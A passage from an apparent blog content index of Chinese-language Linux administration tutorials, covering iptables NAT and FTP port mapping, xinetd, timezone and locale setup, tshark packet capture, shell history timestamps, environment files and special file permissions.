&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;典型的应用是，有个web服务器放在内网配置内网ip，前端有个防火墙配置公网ip，互联网上的访问者使用公网ip来访问这个网站当访问的时候，客户端发出一个数据包，这个数据包的报头里边，目标地址写的是防火墙的公网ip，防火墙会把这个数据包的报头改写一次，将目标地址改写成web服务器的内网ip，然后再把这个数据包发送到内网的web服务器上，这样，数据包就穿透了防火墙，并从公网ip变成了一个对内网地址的访问了，即DNAT，基于目标的网络地址转换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MASQUERADE，地址伪装，在iptables中有着和SNAT相近的效果，但也有一些区别，但使用SNAT的时候，出口ip的地址范围可以是一个，也可以是多个，例如： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下命令表示把所有10.8.0.0网段的数据包SNAT成192.168.5.3的ip然后发出去 1iptables -t nat -A POSTROUTING -s 10.8.0.0/255.255.255.0 -o eth0 -j SNAT --to-source 192.168.5.3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下命令表示把所有10.8.0.0网段的数据包SNAT成192.168.5.3/192.168.5.4/192.168.5.5等几个ip然后发出去 1iptables -t nat -A POSTROUTING -s 10.8.0.0/255.255.255.0 -o eth0 -j SNAT --to-source 192.168.5.3-192.168.5.5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这就是SNAT的使用方法，即可以NAT成一个地址，也可以NAT成多个地址，但是，对于SNAT，不管是几个地址，必须明确的指定要SNAT的ip。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如当前系统用的是ADSL动态拨号方式，那么每次拨号，出口ip192.168.5.3都会改变，而且改变的幅度很大，不一定是192.168.5.3到192.168.5.5范围内的地址，这个时候如果按照现在的方式来配置iptables就会出现问题了，因为每次拨号后，服务器地址都会变化，而iptables规则内的ip是不会随着自动变化的，每次地址变化后都必须手工修改一次iptables，把规则里边的固定ip改成新的ip，这样是非常不好用的。MASQUERADE就是针对这种场景而设计的，他的作用是，从服务器的网卡上，自动获取当前ip地址来做NAT。比如下边的命令： 1iptables -t nat -A POSTROUTING -s 10.8.0.0/255.255.255.0 -o eth0 -j MASQUERADE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如此配置的话，不用指定SNAT的目标ip了，不管现在eth0的出口获得了怎样的动态ip，MASQUERADE会自动读取eth0现在的ip地址然后做SNAT出去，这样就实现了很好的动态SNAT地址转换。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下使用iptables实现内网的ftp端口映射]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F61.%20Linux%E4%B8%8B%E4%BD%BF%E7%94%A8iptables%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%9A%84ftp%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%2F</url>
    <content type="text"><![CDATA[Linux下使用iptables实现内网的ftp端口映射&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有两台机器，其中一台A 有内网和外网，B机器只有内网。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想达到的目的： 通过A机器的外网去访问B机器的ftp（21） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A机器外网IP为 123.234.12.22(eth1) 内网IP为 192.168.10.20 (eth0)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;B机器内网为 192.168.10.21 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实现方法： 让你的linux支持ftp的端口转发modprobe ip_nat_ftp ,加载ip_nat_ftp模块（若没有编译进内核），以使ftp能被正确NAT&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; modprobe ip_conntrack_ftp ,加载ip_conntrack_ftp模块 在A机器上打开端口转发功能 1vi /etc/sysctl.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使 net.ipv4.ip_forward = 1 1sysctl -p 在A机器上创建iptables规则 1iptables -t nat -I PREROUTING -d 123.234.12.22 -p tcp --dport 21 -j DNAT --to 192.168.10.21:21 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把访问外网21端口的包转发到内网ftp服务器 1iptables -t nat -I POSTROUTING -d 192.168.10.21 -p tcp --dport 21 -j SNAT --to 192.168.10.20 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把到内网ftp服务器的包回源到内网网卡上，不然包只能转到ftp服务器，而返回的包不能到达客户端]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用xinetd管理网络应用服务]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F64.%20%E4%BD%BF%E7%94%A8xinetd%E7%AE%A1%E7%90%86%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[使用xinetd管理网路应用服务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认机器没有安装这个服务，需要安装 1yum install -y xinetd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;随着互联网的不断发展以及Linux系统的不断完善，以Linux为系统核心的网络服务器的比重正在逐年上升。从WWW服务器到目前流行的游戏服务器，绝大多数都在采用Linux作为服务平台。正是由于各种应用的不断出现和用户群的增长，基于Linux的系统应当拥有完善的安全措施，应当足够坚固、能够抵抗来自Internet的侵袭，这也正是Linux之所以流行并且成为Internet骨干力量的主要原因。一方面，Linux为用户提供了多种优质的网络服务，包括Http、Ftp、Smtp、Pop3等；另一方面，服务的增多意味着更多的风险。每种服务本身都必然存在着某些缺陷，而这些缺陷很有可能被高明的黑客利用来对系统进行攻击。所以，提供特定服务的服务器应该尽可能开放提供服务必不可少的端口，而将与服务器服务无关的服务关闭，比如：一台作为www和ftp服务器的机器，应该只开放80和25端口，而将其他无关的服务如关掉，以减少系统漏洞。本专题将着重讲述在Linux系统中如何使用xinetd机制来管理网络应用服务。 Xinetd机制介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux系统的早期版本中，有一种称为inetd的网络服务管理程序，也叫作“超级服务器”，就是监视一些网络请求的守护进程，其根据网络请求来调用相应的服务进程来处理连接请求。inetd.conf则是inetd的配置文件。inetd.conf文件告诉inetd监听哪些网络端口，为每个端口启动哪个服务。在任何的网络环境中使用Linux系统，第一件要做的事就是了解一下服务器到底要提供哪些服务。不需要的那些服务应该被禁止掉，这样黑客就少了一些攻击系统的机会，因为服务越多，意味着遭受攻击的风险越打。用户可以查看“/etc/inetd.conf”文件，了解一下inetd提供和开放了哪些服务，以根据实际情况进行相应的处理。而在Linux7.X的版本当中则使用xinetd（扩展的超级服务器）的概念对inetd进行了扩展和替代。因此本专题主要以xinetd为背景，来讲述如何增加和删除网络服务，从而有效地保证Linux系统安全。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;xinetd的默认配置文件是/etc/xinetd.conf。其语法和/etc/inetd.conf完全不同且不兼容。它本质上是/etc/inetd.conf和/etc/hosts.allow，/etc/hosts.deny功能的组合。系统默认使用xinetd的服务可以分为如下几类： 标准internet服务：http、telnet、ftp等； 信息服务：finger、netstat、systat； 邮件服务：imap、pop3、smtp； RPC服务：rquotad 、rstatd、rusersd、sprayd、walld； BSD服务：comsat、exec、login、ntalk、shell talk； 内部服务：chargen、daytime、echo等； 安全服务：irc； 其他服务：name、tftp、uucp、wu-ftp； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上述xinetd提供的服务的用途以及使用方法，用户可以查找相关的资料获得，这里不再赘述。然而，对他们有详细地了解是必不可少的，这可以帮助用户较好地确定需要或者不需要哪些网络服务功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是一个典型的/etc/xinetd.conf文件的例子： 1234567891011121314# vi xinetd.conf## Simple configuration file for xinetd## Some defaults, and include /etc/xinetd.d/defaults&#123; instances = 60 log_type = SYSLOG authpriv log_on_success = HOST PID log_on_failure = HOST cps = 25 30&#125;includedir /etc/xinetd.d &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从文件最后一行可以清楚地看到，/etc/xinetd.d目录是存放各项网络服务（包括http、ftp等）的核心目录，因而系统管理员需要对其中的配置文件进行熟悉和了解。一般说来，在/etc/xinetd.d的各个网络服务配置文件中，每一项具有下列形式： 12345678910service service-name&#123;Disabled //表明是否禁用该服务Flags //可重用标志Socket_type //TCP/IP数据流的类型，包括stream，datagram，raw等Wait //是否阻塞服务，即单线程或多线程User //服务进程的uidServer //服务器守护进程的完整路径log_on_failure //登陆错误日志记录&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中service是必需的关键字，且属性表必须用大括号括起来。每一项都定义了由service-name定义的服务。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Service-name是任意的，但通常是标准网络服务名，也可增加其他非标准的服务，只要它们能通过网络请求激活，包括localhost自身发出的网络请求。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一个service有很多可以使用的attribute，操作符可以是=，+=，或-=。所有属性可以使用=，其作用是分配一个或多个值，某些属性可以使用+=或－=的形式，其作用分别是将其值增加到某个现存的值表中，或将其值从现存值表中删除。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户应该特别注意的是：每一项用户想新添加的网络服务描述既可以追加到现有的/etc/xinetd.conf中，也可以在/etc/xinetd.conf中指定的目录中分别建立单独的文件，RedHat 7.x以上的版本都建议采用后一种做法，因为这样做的可扩充性很好，管理起来也比较方便，用户只需要添加相应服务的描述信息即可追加新的网络服务。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;RedHat 7.x默认的服务配置文件目录是/etc/xinetd.d，在该目录中使用如下命令可以看到许多系统提供的服务： 1234567891011121314151617#cd /etc/xinetd.d#lschargen cvspserver daytime-udp echo-udp ntalk qmail-pop3 rexec rsh sgi_fam telnet time-udp chargen-udp daytime echo finger pop3 qmail-smtp rlogin rsync talk time wu-ftpd然而，上述的许多服务，默认都是关闭的，看看如下文件内容：#cat telnet# default: off //表明默认该服务是关闭的# description: The telnet server serves telnet sessions; it uses \# unencrypted username/password pairs for authentication.service telnet&#123; disable = yes //表明默认该服务是关闭的 flags = REUSE socket_type = stream wait = no user = root server = /usr/sbin/in.telnetd log_on_failure += USERID 服务的开启与关闭&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般说来，用户可以使用两种办法来对网络服务进行开启与关闭。一种为通过文件直接编写进行开启与关闭；另外一种则通过用户熟悉的图形用户界面进行。下面分别进行介绍。 1.使用/etc/xinetd.d目录下的文件进行配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;针对上面列出的关于telnet的例子，用户想要开启服务，只需要通过使用vi 编辑器改写该文件为如下内容： 12345678910service telnet&#123; disable = no //将该域置为“no”，则表明开启该服务 flags = REUSE socket_type = stream wait = no user = root server = /usr/sbin/in.telnetd log_on_failure += USERID&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后，需要使用/etc/rc.d/init.d/xinetd restart来激活Telnet服务即可。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相对应的，如果用户想要关闭某个不需要的服务，则将上述的disable = no改为disable = yes即可，这样就修改了服务配置，并且再次使用/etc/rc.d/init.d/xinetd restart来启用最新的配置。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种方法使用起来相对于Windows下的图形配置方法较为复杂，用户需要对其中的每个参数都有清楚地了解，不能够随意修改，所以建议高级用户或者是有经验的用户使用。 2.使用图形用户界面进行配置：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户可以在终端下键入“setup”命令来对系统提供的服务、防火墙配置、用户授权配置、网络配置、声卡配置、打印机配置等进行全方位的配置。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户选择其中的System services进行配置即可.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户将会看到系统罗列出了anacron,apmd,autofs,chargen,telnet,http等包括我们上面所讲述的xinetd管理的网络服务在内的系统服务进程，用户通过选择这些进程，则可以开启相应的服务。而如果用户想关掉其中的某个服务，则取消选择，保存退出即可以完成配置。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而用户这样设置的结果，就相当于直接对/etc/xinetd.d相应网络服务的配置文件进行了改写，只不过使用起来更加直观和方便，且不需要用户具有比较熟练的Linux使用技巧。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同样需要注意的是，在配置好了相应的网络服务之后，需要执行/etc/rc.d/init.d/xinetd restart命令来对新的改动进行激活，那么就能够使用最新配置的服务了。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后强调用户注意的是，本文给出的使用方法使用效率的高低、正确与否，极大程度上取决于具体的应用，以及用户对各项服务理解程度的不同。希望用户在配置自己的Linux服务器之前，对各种应用服务都作深入地了解，待到根据实际的应用需求确定好需要开启和哪些网络服务之后再使用xinetd机制进行配置，切忌稀里糊涂地进行配置，反而导致产生较大的漏洞和风险。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下调整时区和时间的方法]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F49.%20Linux%E4%B8%8B%E8%B0%83%E6%95%B4%E6%97%B6%E5%8C%BA%E5%92%8C%E6%97%B6%E9%97%B4%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Linux下调整时区和时间的方法 找到相应的时区文件 /usr/share/zoneinfo/Asia/Shanghai，用这个文件替换前的 /etc/localtime 文件。 1cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 修改 /etc/sysconfig/clock 文件，修改为 123ZONE="Asia/Shanghai"UTC=falseARC=false 时间设定成2017年7月10日的命令 1date -s 10/07/2017 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将系统时间设定成下午6点40分0秒的命令 1date -s 18:40:00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实可以两个写一起 1date -s "2017-07-10 18:40:00" 同步BIOS时钟，强制把系统时间写入CMOS，命令 1clock -w 如果有时间服务器，可以用这个命令同步时间 1ntpdate time.windows.com]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux支持中文]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F46.Linux%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%2F</url>
    <content type="text"><![CDATA[Linux支持中文 修改/root/.bash_profile文件，增加export LANG=zh_CN.GB18030对于其他用户，也必须相应修改该文件使用该方法时putty能显示中文，但桌面系统是英文，而且所有的网页中文显示还是乱码 引用:修改/etc/sysconfig/i18n文件 123#LANG="en_US.UTF-8"#SUPPORTED="en_US.UTF-8:en_US:en"#SYSFONT="latarcyrheb-sun16" 改为 12345LANG="zh_CN.GB18030"LANGUAGE="zh_CN.GB18030:zh_CN.GB2312:zh_CN"SUPPORTED="zh_CN.GB18030:zh_CN:zh"SYSFONT="lat0-sun16"SYSFONTACM="8859-15"]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用tshark抓包分析http请求]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F47.%E4%BD%BF%E7%94%A8tshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90http%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[使用tshark抓包分析http请求&#160; &#160; &#160; &#160;默认我们的机器上是没有安装这个工具的。如果你的linux是CentOS那么就使用yum安装 1yum install -y wireshark &#160; &#160; &#160; &#160;也可以到官网下载源码具体安装方法，请参考以下，简单介绍这个抓包工具的应用 &#160; &#160; &#160; &#160;1. 以下的用法可以显示访问http请求的域名以及uri 1tshark -n -t a -R http.request -T fields -e "frame.time" -e "ip.src" -e "http.host" -e "http.request.method" -e "http.request.uri" &#160; &#160; &#160; &#160;2. 以下可以抓取mysql的查询 1tshark -n -i eth1 -R 'mysql.query' -T fields -e "ip.src" -e "mysql.query" &#160; &#160; &#160; &#160;另外一种方法： 1tshark -i eth1 port 3307 -d tcp.port==3307,mysql -z "proto,colinfo,mysql.query,mysql.query" &#160; &#160; &#160; &#160; 3. 以下可以抓取指定类型的MySQL查询 1tshark -n -i eth1 -R 'mysql matches "SELECT|INSERT|DELETE|UPDATE"' -T fields -e "ip.src" -e "mysql.query" &#160; &#160; &#160; &#160;4. 统计http的状态 1tshark -n -q -z http,stat, -z http,tree &#160; &#160; &#160; &#160;这个命令，直到你ctrl + c 才会显示出结果 &#160; &#160; &#160; &#160;5. tshark 增加时间标签 12tshark -t adtshark -t a]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下比较两个时间的时间差]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F48.Linux%E4%B8%8B%E6%AF%94%E8%BE%83%E4%B8%A4%E4%B8%AA%E6%97%B6%E9%97%B4%E7%9A%84%E6%97%B6%E9%97%B4%E5%B7%AE%2F</url>
    <content type="text"><![CDATA[Linux下比较两个时间的时间差&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有一个特殊的需求，知道两个文件的最后修改时间，现在要比较这两个时间的时间差是不是在一个阀值内？这就需要求出连个时间的时间差。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux下，有一个方法可以将基础时间转为时间戳 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，2017-07-13 10:01:05 这个时间的时间戳为 12[root@localhost ~]# date +%s -d '2017-07-13 10:01:05'1499911265 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据这个时间戳，就可以求出两个时间的时间差了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如，求2017-07-13 10:01:05 和 2017-07-13 11:01:05两个时间的时间差 12345[root@localhost ~]# a=`date +%s -d '2017-07-13 10:01:05'`[root@localhost ~]# b=`date +%s -d '2017-07-13 11:01:05'` [root@localhost ~]# time=$[$b-$a][root@localhost ~]# echo $time3600 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;结果就是3600，可见它的单位是秒，如果求分钟，直接除以60即可。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让命令历史永久保存并加时间戳]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F45.%E8%AE%A9%E5%91%BD%E4%BB%A4%E5%8E%86%E5%8F%B2%E6%B0%B8%E4%B9%85%E4%BF%9D%E5%AD%98%E5%B9%B6%E5%8A%A0%E6%97%B6%E9%97%B4%E6%88%B3%2F</url>
    <content type="text"><![CDATA[让命令历史永久保存并加时间戳12345678#!/bin/shgrep HISTTIMEFORMAT /etc/bashrc || echo 'export HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S "' &gt;&gt;/etc/bashrcfor U in `grep -v shutdown /etc/passwd|awk -F: '$NF~/sh/&amp;&amp;$NF!~/no/&#123;print $1&#125;'`do UHOME=`cat /etc/passwd|grep "^$U"|cut -d: -f6` [ ! -f $UHOME/.bash_history ] &amp;&amp; touch $UHOME/.bash_history chattr +a $UHOME/.bash_historydone]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修改Linux系统的默认字符集]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F50.%20%E4%BF%AE%E6%94%B9Linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E9%BB%98%E8%AE%A4%E5%AD%97%E7%AC%A6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[修改Linux系统的默认字符集&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统安装时选择了简体中文安装，安装完成后运行netconfig、setup等命令，中文显示乱码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只要修改 /etc/sysconfig/i18n，默认为 12345LANG="zh_CN.UTF-8" SUPPORTER="zh_CN.UTF-8:zh_CN:zh" SYSFONT="latarcyrheb-sun16" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 12345LANG="en_US.UTF-8" SUPPORTER="en_US.UTF-8:en_US:zh" SYSFONT="latarcyrheb-sun16" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启系统就OK，中文乱码变成了英文显示。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统变量的作用]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F44.Linux%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F%E7%9A%84%E4%BD%9C%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Linux系统变量的作用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/profile、/etc/bashrc、~/.bash_profile、~/.bashrc很容易混淆，他们之间有什么区别？它们的作用到底是什么？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/profile: 用来设置系统环境参数，比如$PATH. 这里面的环境变量是对系统内所有用户生效的。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/bashrc: 这个文件设置系统bash shell相关的东西，对系统内所有用户生效。只要用户运行bash命令，那么这里面的东西就在起作用。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bash_profile: 用来设置一些环境变量，功能和/etc/profile 类似，但是这个是针对用户来设定的，也就是说，你在/home/user1/.bash_profile 中设定了环境变量，那么这个环境变量只针对 user1 这个用户生效. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bashrc: 作用类似于/etc/bashrc, 只是针对用户自己而言，不对其他用户生效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外/etc/profile中设定的变量(全局)的可以作用于任何用户,而~/.bashrc等中设定的变量(局部)只能继承/etc/profile中的变量,他们是”父子”关系. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bash_profile 是交互式、login 方式进入 bash 运行的，意思是只有用户登录时才会生效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bashrc 是交互式 non-login 方式进入 bash 运行的，用户不一定登录，只要以该用户身份运行命令行就会读取该文件。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件权限]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F5.%20Linux%20%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[Linux 文件权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个文件都有一个所有者, 表示该文件是谁创建的. 同时, 该文件还有一个组编号, 表示该文件所属的组, 一般为文件所有者所属的组. 如果是一个可执行文件, 那么在执行时, 一般该文件只拥有调用该文件的用户具有的权限. 而setuid, setgid 可以来改变这种设置. setuid、setgid、sticky bit 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;setuid：用于二进制可执行文件，设置使文件在执行阶段具有文件所有者的权限。典型的文件是 /usr/bin/passwd ，它更改用户的密码时是会更改 /etc/passwd 和 /etc/shadow 等文件的，这些文件默认普通用户没有写权限。如果一般用户执行该文件，则在执行过程中，该文件可以获得 root 权限，从而可以更改用户的密码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;setgid：用于目录，用户在该目录下创建的文件都拥有与该目录相同的属组。当作用在文件上时，作用和 suid 类似，让执行该文件的用户临时拥有属组的权限，目录被设置该位后，任何用户在此目录下创建的文件都具有和该目录所属的组相同的组。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sticky bit：该位可以理解为防删除位。一个文件是否可以被某用户删除，主要取决于该文件所属的组是否对该用户具有写权限。如果没有写权限，则这个目录下的所有文件都不能被删除，同时也不能添加新的文件。如果希望用户能够添加文件但同时不能删除文件，则可以对文件使用 sticky bit 位。设置该位后，就算用户对目录具有写权限，也不能删除该文件。 权限修改操作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;操作这些标志与操作文件权限的命令是一样的，都是 chmod 。有两种方法来操作： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1. 如下 123chmod u+s temp -- 为temp文件加上setuid标志. (setuid 只对文件有效)chmod g+s tempdir -- 为tempdir目录加上setgid标志（可以作用在文件上，效果和suid类似，也可以作用在目录）chmod o+t tempdir -- 为tempdir目录加上sticky标志 (sticky只对目录有效) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2. 用八进制方式。对一般文件通过三组八进制数字来设置标志，如 666 ，777 ，644 等。如果设置这些特殊标志，则在这组数字之外外加一组八进制数字。如 4666 ， 2777 等。这一组八进制数字三围的意义如下： a - setuid 位，如果该位为 1，则表示设置 setuid b - setgid 位，如果该位为 1，则表示设置 setgid c - sticky 位，如果该位为 1，则表示设置 sticky &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也就是说，如果有特殊权限是，第一位数字可以是 0，1（–t），2（-s-），3（-st），4（s–），5（s-t），6（ss-），7（sst） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置完这些标志后，可以用 ls l 来查看。如果有这些标志，则会在原来的执行标志位置上显示。如： 123rwsrw-r-- 表示有setuid标志rwxrwsrw- 表示有setgid标志rwxrw-rwt 表示有sticky标志 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么原来的执行标志 x ，系统是这样规定的。如果本来该为上有 x ，则这些特殊表示显示为小写字母（s ，s ，t）。否则，显示为大写字母（S , S ,T）]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用tar通过网络拷贝数据]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F37.%20%E5%88%A9%E7%94%A8tar%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E6%8B%B7%E8%B4%9D%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[利用tar通过网路拷贝数据12# cd /data // data目录下有我们要拷贝的目标文件目录 test# tar cvf - test| ssh 10.0.1.11 "cd /copy1/; tar xvf -" //首先将要拷贝的目录test打包，"-" 代表标准输出，然后再ssh 到目标主机 10.0.1.11 ，运行相应的命令。其中tar xvf - 意思是，将前面的标准输出内容作为解包的对象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总结：其实就是想拷贝的目录先打包，然后将打包好的文件拷贝到目标主机，最后在目标主机上解包。只不过，我们用一条命令实现了边打包边解包的过程。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统和用户的环境变量配置文件]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F42.Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%94%A8%E6%88%B7%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linux系统和用户的环境变量配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux系统中，有很多系统的变量，这些变量被存在 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/profile: 这个文件预设了几个重要的变量，例如 PATH , USER , LOGNAME , MAIL , INPUTRC , HOSTNAME , HISTSIZE , umake等等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/bashrc: 这个文件主要预设umake以及PS1。这个PS1就是我们在敲命令的时，前面那串字符了，例如CentOS root用户默认PS1就是[root@localhost~]#，PS1的值。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/u 就是用户，/h 主机名，/W 则是当前目录，/$ 就是那个‘#’了。如果普通用户显示为‘$’。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了两个系统级别的配置文件外，每个用户的主目录下还有几个这样的隐藏文件： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_proffile: 定义了用户的个人划路径与环境变量的文件名称。每个用户都可使用该文件输入专用于自己使用的shell信息，当用户登录时，该文件仅仅执行一次。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_history: 记录命令历史用的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_logout: 当退出shell时，会执行该文件。可以把一些清理的工作放到这个文件中。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[yum更新源优先级设置]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F38.yum%E6%9B%B4%E6%96%B0%E6%BA%90%E4%BC%98%E5%85%88%E7%BA%A7%E8%AE%BE%E7%BD%AE%2F</url>
